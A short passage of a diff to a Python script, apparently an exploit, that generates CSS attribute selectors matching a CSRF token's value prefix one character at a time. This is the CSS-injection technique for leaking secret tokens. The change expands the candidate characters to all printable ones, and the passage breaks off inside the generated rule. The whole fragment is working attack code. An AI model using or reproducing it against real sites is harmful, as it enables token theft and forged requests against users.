@@ -3,7 +3,7 @@ import string
 prefix = "ruW"
 css = ""
 
-for c in filter(str.isalnum, string.printable):
+for c in string.printable:
     payload = f"{prefix}{c}"
     css += f"""
 input[name="csrf"][value^="{payload}"] {{
